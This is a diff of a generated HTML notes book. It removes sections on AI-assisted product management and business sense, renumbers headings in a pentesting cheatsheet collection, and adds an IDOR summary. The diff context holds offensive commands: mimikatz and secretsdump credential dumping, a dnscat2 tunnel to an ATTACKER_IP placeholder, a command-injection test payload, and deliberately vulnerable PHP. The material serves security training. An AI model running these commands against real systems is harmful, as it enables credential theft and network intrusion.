-<li>Overstuffed root file – everything loaded every session, kills thinking room</li>
-<li>Full transcripts instead of summaries – 10,000+ tokens vs 500 for structured summary</li>
-</ol>
-<h2 id="3-scaling-analytics-across-functions"><a class="header" href="#3-scaling-analytics-across-functions">3. Scaling Analytics Across Functions</a></h2>
-<h3 id="layer-1-metrics-queries-and-schemas"><a class="header" href="#layer-1-metrics-queries-and-schemas">Layer 1: Metrics, Queries, and Schemas</a></h3>
-<ul>
-<li>Organized by product area, then by data type (metrics.md, queries/, schemas/)</li>
-<li>Can connect to Snowflake MCP for live analysis using verified queries</li>
-</ul>
-<h3 id="layer-2-playbooks-and-verified-approaches"><a class="header" href="#layer-2-playbooks-and-verified-approaches">Layer 2: Playbooks and Verified Approaches</a></h3>
-<ul>
-<li>The analyst’s investigation process checked into the repo as a playbook</li>
-<li>Claude follows the same methodology. Critical: analyst must audit the playbooks</li>
-</ul>
-<h3 id="layer-3-feature-launch-gate"><a class="header" href="#layer-3-feature-launch-gate">Layer 3: Feature Launch Gate</a></h3>
-<ul>
-<li>A feature is not launched until the repo is updated</li>
-<li>Checklist: metric definitions, verified SQL, table schemas, dashboard links, investigation playbooks</li>
-</ul>
-<h2 id="4-writing-10x-docs-with-planning"><a class="header" href="#4-writing-10x-docs-with-planning">4. Writing 10x Docs with Planning</a></h2>
-<h3 id="three-prompting-tiers"><a class="header" href="#three-prompting-tiers">Three Prompting Tiers</a></h3>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Tier</th><th>Approach</th><th>When</th></tr>
-</thead>
-<tbody>
-<tr><td>Basic</td><td>Type request, Claude decides everything</td><td>Quick lookups only</td></tr>
-<tr><td>Lightweight</td><td>“Give me a proposal first”</td><td>Most tasks</td></tr>
-<tr><td>Full plan mode</td><td>Shift+Tab twice; Claude can’t execute until you approve</td><td>Strategy docs, complex work</td></tr>
-</tbody>
-</table>
-</div>
-<h3 id="full-planning-process-five-phases"><a class="header" href="#full-planning-process-five-phases">Full Planning Process (Five Phases)</a></h3>
-<ol>
-<li><strong>Load context</strong> – Claude reads research, docs, writing guides in parallel</li>
-<li><strong>Ask user questions</strong> – Claude clarifies audience, focus, scope</li>
-<li><strong>Build plan file</strong> – section-by-section structure for review</li>
-<li><strong>Push your thinking</strong> – tell Claude to challenge assumptions</li>
-<li><strong>Review agent prompts</strong> – verify what files each agent will read</li>
-</ol>
-<h3 id="parallel-agents-and-temp-files"><a class="header" href="#parallel-agents-and-temp-files">Parallel Agents and Temp Files</a></h3>
-<ul>
-<li>Split complex documents across agents, each writing to a temp file</li>
-<li>Orchestrating agent compiles final doc</li>
-<li>Must explicitly prompt Claude to use temp files</li>
-</ul>
-<p><strong>Key insight:</strong> “Most people under-plan. The plan is not overhead. The plan IS the work.”</p>
-<h2 id="5-the-learning-flywheel"><a class="header" href="#5-the-learning-flywheel">5. The Learning Flywheel</a></h2>
-<ol>
-<li>Automate one task -&gt; free up time</li>
-<li>Use freed time to learn -&gt; improve your repo</li>
-<li>Better repo -&gt; more automation possible</li>
-<li>More automation -&gt; even more time freed</li>
-</ol>
-<h3 id="five-mistakes-that-stall-progress"><a class="header" href="#five-mistakes-that-stall-progress">Five Mistakes That Stall Progress</a></h3>
-<ol>
-<li>Giving up after day one (commit to 30 days)</li>
-<li>Copying without understanding (can’t fix what you don’t understand)</li>
-<li>Treating it as a coding tool (most PM time is writing docs, analysis, prototypes)</li>
-<li>Not clearing between tasks (leftover context pollutes results)</li>
-<li>Context rot (not updating the repo means Claude uses outdated intel)</li>
-</ol>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="business-sense-for-engineers-the-missing-half-of-product-sense"><a class="header" href="#business-sense-for-engineers-the-missing-half-of-product-sense">Business Sense for Engineers: The Missing Half of Product Sense</a></h1>
-<p><strong>Authors:</strong> Sidwyn Koh and Hannah Stulberg | <strong>Published:</strong> 2026-04-25</p>
-<p>Product sense tells you <em>what</em> to build. Business sense tells you <em>why</em> it matters. You need both.</p>
-<h2 id="why-this-matters"><a class="header" href="#why-this-matters">Why This Matters</a></h2>
-<ul>
-<li>Engineer-to-PM ratios are rising at companies like Anthropic, Cursor, OpenAI</li>
-<li>Decisions that used to sit with PMs now need to be made within engineering</li>
-<li>Product sense’s fifth component (strategic thinking) requires deep business sense to function</li>
-</ul>
-<h2 id="the-four-components-of-business-sense"><a class="header" href="#the-four-components-of-business-sense">The Four Components of Business Sense</a></h2>
-<h3 id="1-how-a-company-makes-money-pl-and-unit-economics"><a class="header" href="#1-how-a-company-makes-money-pl-and-unit-economics">1. How a Company Makes Money (P&amp;L and Unit Economics)</a></h3>
-<p><strong>Key metrics:</strong></p>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Metric</th><th>What it measures</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>CLV</strong> (Customer Lifetime Value)</td><td>Total profit a customer generates over full relationship</td></tr>
-<tr><td><strong>CAC</strong> (Customer Acquisition Cost)</td><td>Cost to acquire one new customer</td></tr>
-<tr><td><strong>Payback period</strong></td><td>Time to earn back CAC</td></tr>
-<tr><td><strong>ARPU</strong> (Average Revenue Per User)</td><td>Revenue per active user in a period</td></tr>
-<tr><td><strong>Churn rate</strong></td><td>Percentage of customers who leave. Often the single biggest input into CLV</td></tr>
-</tbody>
-</table>
-</div>
-<h3 id="2-business-model-fluency"><a class="header" href="#2-business-model-fluency">2. Business Model Fluency</a></h3>
-<p>Five common tech business models: subscription, marketplace, SaaS, advertising, transaction-based.</p>
-<p><strong>Pricing model != business model:</strong></p>
-<ul>
-<li>Business model: “How does the company fundamentally make money?”</li>
-<li>Pricing model: “How do we charge for it?”</li>
-<li>Example: Spotify = subscription business with freemium pricing. Slack = SaaS with usage-based seat overages</li>
-</ul>
-<p>The business model determines how to measure feature success. A recommendation engine optimizes for different outcomes depending on the model (stickiness in SaaS, time on site in advertising, transaction volume in marketplace).</p>
-<h3 id="3-market-sizing"><a class="header" href="#3-market-sizing">3. Market Sizing</a></h3>
-<ul>
-<li>Core question: how many customers could we sell to, and how much would they pay?</li>
-<li>Applies at all levels: entire markets, features on a roadmap, technical investments</li>
-<li>Famous example: Uber’s seed pitch estimated $4B TAM. Bill Gurley argued $300B+ because materially improving an offering expands the market</li>
-<li>In practice, engineers size features more than markets. Sequence matters: business priorities set <em>which problems</em> need investment; sizing tells you <em>which solutions</em> are the best bets</li>
-</ul>
-<h3 id="4-competitive-landscape-and-right-to-win"><a class="header" href="#4-competitive-landscape-and-right-to-win">4. Competitive Landscape and Right to Win</a></h3>
-<p><strong>Six questions:</strong></p>
-<ol>
-<li>Who are the real competitors (direct, indirect, non-consumption)?</li>
-<li>What are they good at?</li>
-<li>What’s the deciding factor when customers choose?</li>
-<li>Where are you winning/losing?</li>
-<li>What’s your moat?</li>
-<li>Where is the market heading?</li>
-</ol>
-<p><strong>Five common moats:</strong> network effects, switching costs, economies of scale, brand, distribution</p>
-<p><strong>Examples:</strong></p>
-<ul>
-<li><strong>Stripe (switching costs):</strong> Clean APIs and fast integration. Once teams shipped on Stripe, rewriting for a legacy processor was unthinkable</li>
-<li><strong>Microsoft Teams (distribution):</strong> Bundled free with Microsoft 365 across 345M existing seats. By 2020: Teams 320M DAUs vs Slack 42M. The moat shaped the product strategy, and the product strategy won</li>
-</ul>
-<h2 id="how-to-build-business-sense"><a class="header" href="#how-to-build-business-sense">How to Build Business Sense</a></h2>
-<ol>
-<li><strong>Trace your team’s metrics to the P&amp;L.</strong> Follow OKRs to a business outcome (revenue, retention, cost reduction)</li>
-<li><strong>Attend one business review.</strong> Just listen. Write down unfamiliar terms and look them up</li>
-<li><strong>Read the financials.</strong> Public: read your 10-K. Private: ask finance for a 30-minute P&amp;L walkthrough. Tip: drop a 10-K into NotebookLM for a podcast</li>
-</ol>
-<h2 id="key-takeaway-2"><a class="header" href="#key-takeaway-2">Key Takeaway</a></h2>
-<p>There are always more good product ideas than any team can build. Business sense is the skill of picking the one that will actually move the business.</p>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="cheatsheets"><a class="header" href="#cheatsheets">Cheatsheets</a></h1>
+                        <h1 id="cheatsheets"><a class="header" href="#cheatsheets">Cheatsheets</a></h1>
 <h2 id="directory-map"><a class="header" href="#directory-map">Directory Map</a></h2>
 <ul>
 <li><a href="#api-architectural-styles">api_architecture_styles</a></li>
@@ -1563,7 +520,7 @@ proxychains nmap -sT &lt;TARGET_IP&gt;
 </tbody>
 </table>
 </div>
-<h2 id="notes-1"><a class="header" href="#notes-1">Notes</a></h2>
+<h2 id="notes"><a class="header" href="#notes">Notes</a></h2>
 <ul>
 <li>Default SOCKS5 proxy port is 1080</li>
 <li>Transfer binary to pivot host via <code>scp</code>, <code>wget</code>, or other file transfer method</li>
@@ -1960,7 +917,7 @@ Start-Dnscat2 -DNSserver &lt;ATTACKER_IP&gt; -Domain &lt;DOMAIN&gt; -PreSharedSe
 <pre><code>dnscat2&gt; window -i 1
 </code></pre>
 <p>Use <code>ctrl-z</code> to return to the dnscat2 prompt.</p>
-<h2 id="notes-2"><a class="header" href="#notes-2">Notes</a></h2>
+<h2 id="notes-1"><a class="header" href="#notes-1">Notes</a></h2>
 <ul>
 <li>Uses UDP port 53 by default</li>
 <li>All sessions are encrypted when using <code>--secret</code> / <code>-PreSharedSecret</code></li>
@@ -2556,7 +1513,7 @@ fierce --domain example.com --delay 1
 # Use verbose mode for debugging
 fierce --domain example.com --verbose
 </code></pre>
-<h2 id="notes-3"><a class="header" href="#notes-3">Notes</a></h2>
+<h2 id="notes-2"><a class="header" href="#notes-2">Notes</a></h2>
 <ul>
 <li>Fierce first attempts zone transfers on all discovered name servers</li>
 <li>If zone transfer fails, it falls back to subdomain brute-forcing</li>
@@ -3411,7 +2368,7 @@ sudo umount /media/bitlocker
 <li><code>Get-LAPSComputers</code> — attempt to read actual passwords and expiration dates</li>
 </ol>
 <hr>
-<h2 id="notes-4"><a class="header" href="#notes-4">Notes</a></h2>
+<h2 id="notes-3"><a class="header" href="#notes-3">Notes</a></h2>
 <ul>
 <li>An account that has joined a computer to the domain receives <strong>All Extended Rights</strong> over that host, which includes the ability to read LAPS passwords</li>
 <li>Machines without LAPS installed are potential lateral movement targets (local admin password reuse)</li>
@@ -4849,7 +3806,7 @@ lsadump::dcsync /domain:domain.local /all /csv
 <pre><code class="language-cmd">mimikatz.exe "privilege::debug" "crypto::capi" "crypto::certificates /systemstore:local_machine /export" "exit"
 </code></pre>
 <hr>
-<h2 id="common-errors-1"><a class="header" href="#common-errors-1">Common Errors</a></h2>
+<h2 id="common-errors"><a class="header" href="#common-errors">Common Errors</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -5227,7 +4184,7 @@ net user olduser /del /domain
 <h3 id="establish-null-session"><a class="header" href="#establish-null-session">Establish Null Session</a></h3>
 <pre><code class="language-cmd">net use \\DC01\ipc$ "" /u:""
 </code></pre>
-<h3 id="common-errors-2"><a class="header" href="#common-errors-2">Common Errors</a></h3>
+<h3 id="common-errors-1"><a class="header" href="#common-errors-1">Common Errors</a></h3>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -5867,7 +4824,7 @@ proxychains nmap -sV -sT &lt;TARGET_IP&gt; -p3389
 </tbody>
 </table>
 </div>
-<h2 id="notes-5"><a class="header" href="#notes-5">Notes</a></h2>
+<h2 id="notes-4"><a class="header" href="#notes-4">Notes</a></h2>
 <ul>
 <li>Requires root/sudo (raw ICMP sockets)</li>
 <li>Only works when ICMP echo is permitted through the firewall</li>
@@ -6323,7 +5280,7 @@ pypykatz dpapi credential &lt;cred_file&gt; &lt;guid&gt;:&lt;key_hex&gt;
 </table>
 </div>
 <hr>
-<h2 id="configuration-1"><a class="header" href="#configuration-1">Configuration</a></h2>
+<h2 id="configuration"><a class="header" href="#configuration">Configuration</a></h2>
 <h3 id="config-file-location"><a class="header" href="#config-file-location">Config File Location</a></h3>
 <pre><code>/etc/responder/Responder.conf
 </code></pre>
@@ -9710,7 +8667,7 @@ Resources:
 </ul>
 </li>
 </ul>
-<h2 id="key-concepts-1"><a class="header" href="#key-concepts-1">Key Concepts</a></h2>
+<h2 id="key-concepts"><a class="header" href="#key-concepts">Key Concepts</a></h2>
 <h3 id="kinesis-data-streams"><a class="header" href="#kinesis-data-streams">Kinesis Data Streams:</a></h3>
 <ul>
 <li>
@@ -20602,7 +19559,7 @@ Ping statistics for 192.168.225.110:
 </table>
 </div>
 <hr>
-<h2 id="key-takeaways-1"><a class="header" href="#key-takeaways-1">Key Takeaways</a></h2>
+<h2 id="key-takeaways"><a class="header" href="#key-takeaways">Key Takeaways</a></h2>
 <ul>
 <li>DNS zone transfers (AXFR) can expose the entire DNS namespace if not properly restricted</li>
 <li>Subdomain takeover is possible when CNAME records point to expired/unclaimed third-party services</li>
@@ -22070,7 +21027,7 @@ secretsdump.py -just-dc-user DOMAIN/administrator "DC_HOSTNAME$"@&lt;DC_IP&gt; -
 <h2 id="printnightmare-1"><a class="header" href="#printnightmare-1">PrintNightmare</a></h2>
 <p><strong>CVEs:</strong> CVE-2021-34527 + CVE-2021-1675</p>
 <p>Remote code execution via the Print Spooler service. Runs on all Windows OS versions.</p>
-<h3 id="prerequisites-1"><a class="header" href="#prerequisites-1">Prerequisites</a></h3>
+<h3 id="prerequisites"><a class="header" href="#prerequisites">Prerequisites</a></h3>
 <ul>
 <li>cube0x0’s version of Impacket (different from standard Impacket)</li>
 <li>Print System Asynchronous Protocol (MS-PAR) and Print System Remote Protocol (MS-RPRN) exposed on target</li>
@@ -22268,7 +21225,7 @@ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-
 </ul>
 <h2 id="invalidation"><a class="header" href="#invalidation">Invalidation</a></h2>
 <p>The only way to invalidate Golden Tickets is to <strong>change the KRBTGT account password</strong> (twice, since AD retains the previous password). This should be done periodically and always after a penetration test where domain compromise was achieved.</p>
-<h2 id="key-takeaways-2"><a class="header" href="#key-takeaways-2">Key Takeaways</a></h2>
+<h2 id="key-takeaways-1"><a class="header" href="#key-takeaways-1">Key Takeaways</a></h2>
 <ul>
 <li>Compromising any child domain in a forest = compromising the entire forest</li>
 <li>The target user in the Golden Ticket does not need to exist</li>
@@ -23154,7 +22111,7 @@ netdom query /domain:inlanefreight.local workstation
 <li>Check if compromised accounts in trusted domains have admin access in the target domain</li>
 <li>Visualize with BloodHound’s “Map Domain Trusts” query</li>
 </ol>
-<h2 id="key-takeaways-3"><a class="header" href="#key-takeaways-3">Key Takeaways</a></h2>
+<h2 id="key-takeaways-2"><a class="header" href="#key-takeaways-2">Key Takeaways</a></h2>
 <ul>
 <li>Bidirectional trusts with acquired companies are a common source of unintended risk</li>
 <li>A foothold in a weaker trusted domain can lead to full compromise of the principal domain</li>
@@ -23497,7 +22454,7 @@ Get-DomainPolicy
 <li><strong>Search breach data</strong> — Dehashed, HaveIBeenPwned for credential leaks</li>
 <li><strong>Build wordlists</strong> — Combine findings for targeted password spraying</li>
 </ol>
-<h3 id="key-takeaways-4"><a class="header" href="#key-takeaways-4">Key Takeaways</a></h3>
+<h3 id="key-takeaways-3"><a class="header" href="#key-takeaways-3">Key Takeaways</a></h3>
 <ul>
 <li>Always save files, screenshots, scan output, and tool output as soon as you find them</li>
 <li>If stuck during a pentest, revisit passive recon for additional leads (e.g. breach data for VPN access)</li>
@@ -23792,7 +22749,7 @@ sudo crackmapexec smb &lt;DC_IP&gt; -u &lt;USER&gt; -p '&lt;PASSWORD&gt;'
 <li>The TGS ticket (TGS-REP) is encrypted with the service account’s NTLM hash — crackable offline with no interaction with the target</li>
 <li>Even a low-privilege cracked account can be useful: if the SPN is <code>MSSQL/SRV01</code>, you get sysadmin access to that SQL instance and can enable <code>xp_cmdshell</code> for code execution</li>
 </ul>
-<h3 id="prerequisites-2"><a class="header" href="#prerequisites-2">Prerequisites</a></h3>
+<h3 id="prerequisites-1"><a class="header" href="#prerequisites-1">Prerequisites</a></h3>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -24551,7 +23508,7 @@ TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
 <h3 id="john-the-ripper"><a class="header" href="#john-the-ripper">John the Ripper</a></h3>
 <pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt forend_ntlmv2
 </code></pre>
-<h2 id="key-takeaways-5"><a class="header" href="#key-takeaways-5">Key Takeaways</a></h2>
+<h2 id="key-takeaways-4"><a class="header" href="#key-takeaways-4">Key Takeaways</a></h2>
 <ul>
 <li>LLMNR/NBT-NS poisoning is one of the most common ways to gain an initial foothold during internal AD assessments</li>
 <li>Start Responder early and let it run passively while performing other enumeration</li>
@@ -24821,7 +23778,7 @@ Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="password-spraying-overview"><a class="header" href="#password-spraying-overview">Password Spraying Overview</a></h1>
 <p>Password spraying is a technique used to gain access to systems by attempting to log into an exposed service using <strong>one common password</strong> against a <strong>long list of usernames or email addresses</strong>. Unlike brute-forcing (many passwords against one account), password spraying is a measured approach that reduces the risk of account lockouts.</p>
-<h2 id="key-concepts-2"><a class="header" href="#key-concepts-2">Key Concepts</a></h2>
+<h2 id="key-concepts-1"><a class="header" href="#key-concepts-1">Key Concepts</a></h2>
 <ul>
 <li>Usernames/emails are typically gathered during OSINT or initial enumeration phases.</li>
 <li>The attack tries a single common password (e.g., <code>Welcome1</code>, <code>Passw0rd</code>, <code>Winter2022</code>) across all target accounts, then rotates to the next password after a delay.</li>
@@ -25115,7 +24072,7 @@ SQL&gt; xp_cmdshell whoami /priv
 <pre><code class="language-sql">xp_cmdshell whoami /priv
 </code></pre>
 <p>If <code>SeImpersonatePrivilege</code> is <code>Enabled</code>, the host is exploitable.</p>
-<h2 id="key-takeaways-6"><a class="header" href="#key-takeaways-6">Key Takeaways</a></h2>
+<h2 id="key-takeaways-5"><a class="header" href="#key-takeaways-5">Key Takeaways</a></h2>
 <ul>
 <li>Always check remote access rights (RDP, WinRM, SQLAdmin) after gaining each new account — even non-admin access can lead to further compromise</li>
 <li>Enumeration and attack is iterative: repeat enumeration after every new account takeover</li>
@@ -27483,7 +26440,7 @@ Microsoft Windows [Version 10.0.17763.1637]
 
 C:\&gt;
 </code></pre>
-<h2 id="when-to-use-2"><a class="header" href="#when-to-use-2">When to Use</a></h2>
+<h2 id="when-to-use"><a class="header" href="#when-to-use">When to Use</a></h2>
 <ul>
 <li>Already have a Meterpreter session on the pivot host</li>
 <li>Need SOCKS proxy routing without SSH access</li>
@@ -27625,7 +26582,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 <pre><code class="language-bash">proxychains smbclient -L //172.16.5.19 -U 'domain\user'
 proxychains crackmapexec smb 172.16.5.19 -u user -p password
 </code></pre>
-<h2 id="when-to-use-3"><a class="header" href="#when-to-use-3">When to Use</a></h2>
+<h2 id="when-to-use-1"><a class="header" href="#when-to-use-1">When to Use</a></h2>
 <ul>
 <li>Scanning networks not directly reachable</li>
 <li>Accessing multiple services on internal network</li>
@@ -27709,7 +26666,7 @@ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
 # 2. In another terminal, connect to MySQL
 mysql -h 127.0.0.1 -P 1234 -u root -p
 </code></pre>
-<h2 id="when-to-use-4"><a class="header" href="#when-to-use-4">When to Use</a></h2>
+<h2 id="when-to-use-2"><a class="header" href="#when-to-use-2">When to Use</a></h2>
 <ul>
 <li>Access services bound to localhost on remote host</li>
 <li>Run local exploits against remote services</li>
@@ -27738,7 +26695,7 @@ mysql -h 127.0.0.1 -P 1234 -u root -p
 </tbody>
 </table>
 </div>
-<h2 id="the-problem-1"><a class="header" href="#the-problem-1">The Problem</a></h2>
+<h2 id="the-problem"><a class="header" href="#the-problem">The Problem</a></h2>
 <pre><code>Attack Host (10.10.15.x)
     │
     │ SSH ✓
@@ -27806,7 +26763,7 @@ msf6 &gt; run
 <pre><code>debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
 debug1: channel 1: connected to 0.0.0.0 port 8000
 </code></pre>
-<h2 id="when-to-use-5"><a class="header" href="#when-to-use-5">When to Use</a></h2>
+<h2 id="when-to-use-3"><a class="header" href="#when-to-use-3">When to Use</a></h2>
 <ul>
 <li>Target has no route to attack host</li>
 <li>Need reverse shell through pivot</li>
@@ -28160,12 +27117,14 @@ $result = $conn-&gt;query($query);
 <li><a href="#http-verb-tampering--bypassing-basic-authentication">HTTP Verb Tampering — bypassing basic auth — identify restricted pages, OPTIONS enumeration, HEAD bypass</a></li>
 <li><a href="#http-verb-tampering--bypassing-security-filters">HTTP Verb Tampering — bypassing security filters — method-scoped filters, switching methods, confirming command injection</a></li>
 <li><a href="#http-verb-tampering--prevention">HTTP Verb Tampering — prevention — insecure config fixes (Apache, Tomcat, ASP.NET), insecure coding fixes</a></li>
+<li><a href="#intro-to-idor">Intro to IDOR — what it is, why common, impact (disclosure, modification, privilege escalation), attack pattern</a></li>
 </ul>
 <h2 id="summary-11"><a class="header" href="#summary-11">Summary</a></h2>
 <p>Web attacks are the most common class of attacks against businesses, targeting external-facing applications, internal web apps, and API endpoints alike. This section covers three attack types found across many web applications. <strong>HTTP Verb Tampering</strong> exploits servers that accept unexpected HTTP methods, allowing attackers to bypass authorization mechanisms and security controls by sending requests with non-standard verbs. <strong>Insecure Direct Object References (IDOR)</strong> exploit weak or missing back-end access controls: when applications use predictable identifiers (sequential IDs, user numbers) to reference resources, an attacker can guess or calculate valid IDs to access other users’ data. <strong>XML External Entity (XXE) Injection</strong> targets applications using outdated XML parsers to process user-supplied XML — malicious payloads can read local files (configs, source code, credentials), enable whitebox testing, steal server credentials, and potentially achieve remote code execution.</p>
 <p>HTTP Verb Tampering vulnerabilities stem from two sources. <strong>Insecure server configuration</strong> occurs when authentication rules are scoped to specific methods (e.g., <code>&lt;Limit GET POST&gt;</code>) leaving any other verb — such as <code>HEAD</code> — unauthenticated and freely accessible. <strong>Insecure coding</strong> occurs when input sanitization is applied to one HTTP method (e.g., <code>$_GET</code>) while the query uses a broader parameter source (e.g., <code>$_REQUEST</code>), allowing an attacker to switch to POST to bypass the filter entirely. The coding variant is more prevalent because it arises from common developer mistakes rather than misconfiguration.</p>
 <p><strong>Bypassing security filters</strong> is the more common variant: if a filter only inspects one method’s parameter source (e.g., <code>$_POST</code>), switching to a different method (e.g., GET) carries the payload through an unchecked channel while the underlying function (using <code>$_REQUEST</code>) still processes it. To confirm exploitation, use a two-file command injection payload (<code>file1; touch file2;</code>) — both files appearing proves command execution. A web app that appears fully filtered against injection may be completely exposed once the method is switched.</p>
 <p><strong>Bypassing basic authentication</strong> via verb tampering follows a short process: identify the restricted page/directory, intercept the request, try switching GET → POST (if also blocked, move on), send an <code>OPTIONS</code> request to enumerate accepted methods (<code>curl -i -X OPTIONS http://TARGET/</code>), then try <code>HEAD</code>. Because <code>HEAD</code> is accepted by default on most servers and is often excluded from <code>&lt;Limit&gt;</code> blocks, it bypasses the auth prompt while still executing the server-side action — the empty response body is expected behavior, not a failure. Verify success by checking application state rather than response content.</p>
+<p><strong>IDOR</strong> vulnerabilities arise when a web application exposes direct references to internal objects (file IDs, database records, API paths) <strong>without back-end access control</strong> validating that the requesting user is authorized. The reference itself is not the flaw — the missing authorization check is. Impact ranges from <strong>information disclosure</strong> (reading other users’ files/PII) to <strong>data modification/account takeover</strong> (write-capable references) to <strong>privilege escalation</strong> (calling admin-only API endpoints that the back-end fails to restrict to admin roles). IDOR is pervasive because access control is inherently hard to build, hard to automate testing for, and frequently skipped by developers who rely on front-end logic alone.</p>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-verb-tampering--bypassing-basic-authentication"><a class="header" href="#http-verb-tampering--bypassing-basic-authentication">HTTP Verb Tampering — Bypassing Basic Authentication</a></h1>
 <p>Exploiting insecure server configuration verb tampering is straightforward: try alternate HTTP methods and observe how the server handles them. Automated scanners catch this type reliably (auth bypass is obvious once it works), but miss the insecure-coding variant, which requires active testing.</p>
@@ -28228,60 +27187,6 @@ Allow: POST,OPTIONS,HEAD,GET
 <h2 id="key-point-1"><a class="header" href="#key-point-1">Key point</a></h2>
 <p>HTTP Verb Tampering can turn a well-filtered vulnerability into an exploitable one. A web application may appear secure against injection when tested normally, but if the filter does not cover all HTTP methods, a simple method switch exposes the underlying flaw.</p>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="http-verb-tampering"><a class="header" href="#http-verb-tampering">HTTP Verb Tampering</a></h1>
-<h2 id="how-http-methods-work"><a class="header" href="#how-http-methods-work">How HTTP methods work</a></h2>
-<p>HTTP servers accept various methods (verbs) at the start of a request and perform different actions depending on which is used. Most developers only consider <strong>GET</strong> and <strong>POST</strong>, but clients can send any method — how the server handles unexpected ones determines whether a vulnerability exists.</p>
-<p>If a server is configured to accept <strong>only</strong> GET/POST, an unknown method returns an error page (minor UX/info-disclosure issue, not a critical vulnerability). If the server accepts additional methods without being configured to handle them securely, those methods can be exploited.</p>
-<h2 id="http-verbs-reference"><a class="header" href="#http-verbs-reference">HTTP verbs reference</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Verb</th><th>Description</th></tr>
-</thead>
-<tbody>
-<tr><td><code>GET</code></td><td>Retrieve a resource</td></tr>
-<tr><td><code>POST</code></td><td>Submit data to be processed</td></tr>
-<tr><td><code>HEAD</code></td><td>Identical to GET but returns headers only — no response body</td></tr>
-<tr><td><code>PUT</code></td><td>Write the request payload to the specified location</td></tr>
-<tr><td><code>DELETE</code></td><td>Delete the resource at the specified location</td></tr>
-<tr><td><code>OPTIONS</code></td><td>List accepted HTTP methods/options for a resource</td></tr>
-<tr><td><code>PATCH</code></td><td>Apply partial modifications to a resource</td></tr>
-</tbody>
-</table>
-</div>
-<p><code>PUT</code> and <code>DELETE</code> in particular can be destructive — writing or removing files in the webroot — if the server is not locked down.</p>
-<h2 id="vulnerability-sources"><a class="header" href="#vulnerability-sources">Vulnerability sources</a></h2>
-<p>HTTP Verb Tampering vulnerabilities arise from two distinct sources:</p>
-<h3 id="insecure-server-configuration"><a class="header" href="#insecure-server-configuration">Insecure server configuration</a></h3>
-<p>Authentication rules scoped to specific methods leave other methods unauthenticated. Example Apache/similar config:</p>
-<pre><code class="language-xml">&lt;Limit GET POST&gt;
-    Require valid-user
-&lt;/Limit&gt;
-</code></pre>
-<p>This enforces authentication on GET and POST, but a request using <code>HEAD</code> (or any other unlisted verb) bypasses the rule entirely. An attacker can reach protected pages without credentials.</p>
-<h3 id="insecure-coding"><a class="header" href="#insecure-coding">Insecure coding</a></h3>
-<p>Filters or sanitization applied only to one HTTP method while the underlying query uses a broader parameter source. Example PHP:</p>
-<pre><code class="language-php">$pattern = "/^[A-Za-z\s]+$/";
-
-if (preg_match($pattern, $_GET["code"])) {
-    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
-    ...
-}
-</code></pre>
-<p>The sanitization check runs against <code>$_GET["code"]</code>, but the query uses <code>$_REQUEST["code"]</code> — which includes POST parameters. An attacker sends the payload via <strong>POST</strong> (leaving GET empty), the filter passes on the empty GET value, and the unsanitized POST value reaches the query. The SQL injection mitigation is bypassed entirely.</p>
-<h2 id="comparison-1"><a class="header" href="#comparison-1">Comparison</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Type</th><th>Cause</th><th>Prevalence</th></tr>
-</thead>
-<tbody>
-<tr><td>Insecure server config</td><td>Auth restricted to specific verbs</td><td>Less common — documentation warns against it</td></tr>
-<tr><td>Insecure coding</td><td>Filter applied to one method, query uses another</td><td>More common — easy mistake in application code</td></tr>
-</tbody>
-</table>
-</div>
-<div style="break-before: page; page-break-before: always;"></div>
 <h1 id="http-verb-tampering--prevention"><a class="header" href="#http-verb-tampering--prevention">HTTP Verb Tampering — Prevention</a></h1>
 <p>Two root causes: insecure server configurations and insecure application code. Both must be addressed.</p>
 <h2 id="insecure-configuration"><a class="header" href="#insecure-configuration">Insecure Configuration</a></h2>
@@ -28339,7 +27244,7 @@ if (preg_match($pattern, $_GET["code"])) {
 </table>
 </div>
 <p>Additionally, consider <strong>disabling/denying all HEAD requests</strong> unless specifically required by the web application.</p>
-<h2 id="insecure-coding-1"><a class="header" href="#insecure-coding-1">Insecure Coding</a></h2>
+<h2 id="insecure-coding"><a class="header" href="#insecure-coding">Insecure Coding</a></h2>
 <p>Harder to identify than config issues — requires finding inconsistencies in HTTP parameter usage across functions.</p>
 <h3 id="vulnerable-php-example"><a class="header" href="#vulnerable-php-example">Vulnerable PHP Example</a></h3>
 <pre><code class="language-php">if (isset($_REQUEST['filename'])) {
@@ -28373,6 +27278,100 @@ if (preg_match($pattern, $_GET["code"])) {
 </table>
 </div>
 <p>If security-related functions cover all methods, verb tampering bypasses are eliminated.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="http-verb-tampering"><a class="header" href="#http-verb-tampering">HTTP Verb Tampering</a></h1>
+<h2 id="how-http-methods-work"><a class="header" href="#how-http-methods-work">How HTTP methods work</a></h2>
+<p>HTTP servers accept various methods (verbs) at the start of a request and perform different actions depending on which is used. Most developers only consider <strong>GET</strong> and <strong>POST</strong>, but clients can send any method — how the server handles unexpected ones determines whether a vulnerability exists.</p>
+<p>If a server is configured to accept <strong>only</strong> GET/POST, an unknown method returns an error page (minor UX/info-disclosure issue, not a critical vulnerability). If the server accepts additional methods without being configured to handle them securely, those methods can be exploited.</p>
+<h2 id="http-verbs-reference"><a class="header" href="#http-verbs-reference">HTTP verbs reference</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
